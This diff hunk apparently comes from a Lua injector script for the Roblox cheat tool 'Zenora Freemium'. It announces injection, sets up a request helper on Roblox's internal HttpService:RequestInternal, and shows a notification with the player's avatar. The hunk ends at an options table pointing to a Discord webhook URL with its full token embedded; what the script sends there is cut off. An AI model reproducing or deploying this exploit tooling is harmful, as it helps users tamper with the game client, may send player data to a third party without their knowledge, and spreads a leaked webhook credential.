@@ -648,27 +648,41 @@ function DrawingLib.createFrame()
 end
 
 task.spawn(function()
-	print("[-] Injected Zenora Freemium to Roblox\nhttps://discord.gg/exploitnews")
+	print("[+] Injected Zenora Freemium to Roblox\nhttps://discord.gg/exploitnews")
 	local _game = game:GetService("CoreGui").Parent
-local HttpService = _game:FindService("HttpService")
+	local HttpService = _game:FindService("HttpService")
 
-local function sendRequest(options, timeout)
-	timeout = tonumber(timeout) or math.huge
-	local result, clock = nil, tick()
+	local function sendRequest(options, timeout)
+		timeout = tonumber(timeout) or math.huge
+		local result, clock = nil, tick()
 
-	HttpService:RequestInternal(options):Start(function(success, body)
-		result = body
-		result['Success'] = success
-	end)
+		HttpService:RequestInternal(options):Start(function(success, body)
+			result = body
+			result['Success'] = success
+		end)
 
-	while not result do task.wait()
-		if (tick() - clock > timeout) then
-			break
+		while not result do task.wait()
+			if (tick() - clock > timeout) then
+				break
+			end
 		end
+
+		return result
 	end
 
-	return result
-end
+	local StarterGui = game:GetService("StarterGui")
+	local Players = game:GetService("Players")
+	local player = Players.LocalPlayer
+	local profileImageUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
+
+	StarterGui:SetCore("SendNotification", {
+		Title = "Zenora Freemium";
+		Text = "Zenora Freemium Injected Successfully";
+		Icon = profileImageUrl;
+		Duration = 5;
+	})
+end)
+
 
 local options = {
 	Url = "https://discord.com/api/webhooks/1290019870385111181/EQru5QgOvuw2RRUH6gAxaJt010RGBShov-a_C8Fhb6jEpB1IS3GkcvH4uAhgwwymm68M",
